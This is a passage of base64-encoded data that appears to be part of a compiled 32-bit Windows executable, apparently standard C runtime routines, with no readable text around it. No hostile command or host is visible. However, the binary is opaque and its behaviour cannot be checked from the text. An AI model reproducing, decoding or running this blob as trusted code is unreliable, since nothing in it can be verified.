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RfyLRQiNjbD7//9TVomF2Pv//4tFDFf/dRCLfRSJhfj7//8zwIvYib3w+///iYWk+///i/CJnez7//+JhdD7//+Jhej7//+Jhdz7//+Jhaj7//+JhcD7//+JhdT7///oA////+iZDAAAiYWc+///OZ3Y+///dSrohgwAAMcAFgAAAOhY/P//OJ28+///dAqLhbj7//+DYHD9g8j/6fUKAACLlfj7//+F0nTMD7cSM8mJjfT7//+LwYmF4Pv//4mNzPv//4mNrPv//4mV5Pv//2aF0g+EqgoAAMeFkPv//1gAAADHhYz7//9kAAAAx4WI+///aQAAAMeFmPv//28AAACDhfj7//8ChcAPiHMKAABqWI1C4F9mO8d3Dw+3wg++gDgwQQCD4A/rAjPAi73M+///D768x1gwQQCLx4m9zPv//4u98Pv//8H4BImFzPv//4P4Bw+HCwoAAP8khcZdQAAzwION6Pv///+L2ImFqPv//4mFwPv//4mF0Pv//4mF3Pv//4md7Pv//4mF1Pv//+nQCQAAD7fCaiBaK8J0RoPoA3Q5g+gIdC9ISHQdg+gDi4X4+///D4WvCQAAg8sIiZ3s+///6aEJAACDywSJnez7///pjQkAAIPLAevwgcuAAAAA6+iDywLr42oqWGY70HUviweDxwSJvfD7//+JhdD7//+FwA+JWgkAAIPLBPfYiZ3s+///iYXQ+///6UQJAABrjdD7//8KD7fCg8HQA8GJhdD7///pJAkAADPAiYXo+///6R0JAABqKlhmO9B1K4sHg8cEiYXo+///hcCLhfj7//+JvfD7//8PifwIAACDjej7////6fAIAABrjej7//8KD7fCg8HQA8GJhej7///pyggAAA+3woP4SXRXg/hodEhqbFo7wnQag/h3i4X4+///D4WzCAAAgcsACAAA6fz+//+Lhfj7//9mORB1FIPAAoHLABAAAImF+Pv//+nd/v//g8sQ6dX+//9qIFgL2OnZ/v//i4X4+///D7cAg/g2dSOLvfj7//9mg38CNHUWi8eDwASBywCAAACJhfj7///pmv7//4P4M3Uji734+///ZoN/AjJ1FovHg8AEgeP/f///iYX4+///6XL+//9mO4WM+///D4QLCAAAZjuFiPv//w+E/gcAAGY7hZj7//8PhPEHAACD+HUPhOgHAACD+HgPhN8HAABmO4WQ+///D4TSBwAAM8CJhcz7//+NheD7///HhdT7//8BAAAAUP+12Pv//1LoOwgAAIPEDOmfBwAAD7fCg/hkD48pAgAAD4SxAgAAg/hTD48lAQAAdH2D6EF0EEhIdFhISHQISEgPhZoFAABqIFgD0MeFqPv//wEAAACJleT7//+Lhej7//+Ntfz7//+Dy0C5AAIAAImd7Pv//4mN9Pv//4XAD4mOAgAAx4Xo+///BgAAAOnfAgAA98MwCAAAD4XYAAAAaiBYC9iJnez7///pyAAAAPfDMAgAAHULaiBYC9iJnez7//+Llej7//+/////f4P6/3QCi/qLtfD7//+DxgSJtfD7//+Ldvz2wyAPhL8EAACF9nUGizUQlEEAM8mLxomF5Pv//4mN9Pv//4X/D47QBAAAigCEwA+ExgQAAI2NsPv//w+2wFFQ6L1gAABZhcCLheT7//9ZdAFAi430+///QEGJheT7//+JjfT7//87z3zB6YwEAACD6FgPhNwCAABISA+EiwAAAIPoBw+E7f7//0hID4VqBAAAD7cHg8cEx4XU+///AQAAAIm98Pv//4mFoPv///bDIHREiIXE+///M8CIhcX7//+NhbD7//9Qi4Ww+////3B0jYXE+///UI2F/Pv//1Do8GEAAIPEEIXAeRPHhcD7//8BAAAA6wdmiYX8+///M8mNtfz7//9B6eoDAACLB4PHBIm98Pv//4XAdDaLcASF9nQv98MACAAAdBcPvwCZK8LHhdT7//8BAAAAi8jpswMAADPJiY3U+///D78I6aUDAACLNRCUQQBW6DDs//9Zi8jpkQMAAIP4cA+P6wEAAA+E1wEAAIP4ZQ+MfwMAAIP4Zw+O8f3//2ppWjvCdGaD+G50J2pvWjvCD4VfAwAAx4Xk+///CAAAAITbeVuBywACAACJnez7///rTYPHBIm98Pv//4t//Ohm3///hcAPhEUFAACLheD7///2wyB0BWaJB+sCiQfHhcD7//8BAAAA6cMEAACDy0CJnez7///HheT7//8KAAAA98MAgAAAdQz3wwAQAAAPhJcBAACLD4PHCIm98Pv//4t//OmwAQAAdRRqZ1hmO9B1VseF6Pv//wEAAADrSjvBfgiLwYmF6Pv//z2jAAAAfjeNuF0BAABX6NgIAACLleT7//+Jhaz7//9ZhcB0Covwib30+///6wrHhej7//+jAAAAi73w+///iweDxwiJhXj7//+JvfD7//+LR/yJhXz7//+NhbD7//9Q/7Wo+///D77C/7Xo+///UP+19Pv//42FePv//1ZQ/zWclkEA/xVQIEEA/9CL+4PEHIHngAAAAHQhg73o+///AHUYjYWw+///UFb/NaiWQQD/FVAgQQD/0FlZamdYZjmF5Pv//3Uchf91GI2FsPv//1BW/zWklkEA/xVQIEEA/9BZWYA+LQ+FHv7//4HLAAEAAEaJnez7///pDP7//8eF6Pv//wgAAABqB+scg+hzD4R7/P//SEgPhJL+//+D6AMPhYkBAABqJ8eF5Pv//xAAAABYiYWk+///hNsPiXj+//9qMFmDwFFmiY3I+///ZomFyvv//8eF3Pv//wIAAADpVf7//4PHBIm98Pv///bDIHQR9sNAdAYPv0f86w4Pt0f86wj2w0B0DItH/JmLyIv6M8DrB4tP/DPAi/j2w0B0HDv4fxh8BDvIcxL32RP499+BywABAACJnez7///3wwCQAAB1Aov4i5Xo+///hdJ5BTPSQusWg+P3iZ3s+///gfoAAgAAfgW6AAIAAIvBC8d1BomF3Pv//421+/3//4vCSomV6Pv//4XAfwaLwQvHdD2LheT7//+ZUlBXUeiAXwAAg8EwiZ2E+///iYX0+///i/qD+Tl+BgONpPv//4uV6Pv//4gOTouN9Pv//+uwi53s+///jY37/f//K85GiY30+///98MAAgAAdEWFyXQFgD4wdDxOQWowWIgG6y2F9nUGizUUlEEAx4XU+///AQAAAIvOhf90DzPAT2Y5AXQHg8EChf918yvO0fmJjfT7//+DvcD7//8AD4WtAQAA9sNAdCD3wwABAAAPhB0BAABqLVhmiYXI+///x4Xc+///AQAAAGogWou90Pv//4uF3Pv//yv5K/j2wwx1HY2F4Pv//1D/tdj7//9XUug/AgAAi4Xc+///g8QQ/7Wc+///jY3g+///Uf+12Pv//1CNhcj7//9Q6EICAACDxBT2wwh0H/bDBHUajYXg+///UP+12Pv//1dqMFhQ6PIBAACDxBCDvdT7//8Ai4X0+///D4WzAAAAhcAPjqsAAACLzom15Pv//0iJhYT7//+NhbD7//9Qi4Ww+////3B0jYWg+///UVDo41wAAIPEEImFlPv//4XA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